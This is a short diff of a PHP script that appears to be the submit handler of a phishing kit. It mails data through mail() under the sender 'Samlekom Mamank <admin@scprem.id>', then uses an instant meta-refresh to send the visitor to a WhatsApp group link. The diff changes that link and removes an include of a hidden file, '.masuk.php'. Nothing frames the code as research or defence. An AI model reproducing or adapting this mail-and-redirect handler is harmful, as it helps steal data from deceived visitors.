@@ -32,11 +32,10 @@ $headersx  = 'MIME-Version: 1.0' . "\r\n";
 $headersx .=  'Content-type: text/html; charset=iso-8859-1' . "\r\n";
 $headersx .= 'From: Samlekom Mamank <admin@scprem.id>' . "\r\n";
 $datamail = mail($email, $subject, $message, $headersx);
-include '.masuk.php';
 ?>
 <html>
 <head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
-<meta http-equiv="REFRESH" content="0;url=https://chat.whatsapp.com/IHT9HZguYzE7CKEQC5Cjg7">
+<meta http-equiv="REFRESH" content="0;url=https://chat.whatsapp.com/IiXF0d5qUBKGLd3A6MHYym">
 </head>
 <body>
 </body>
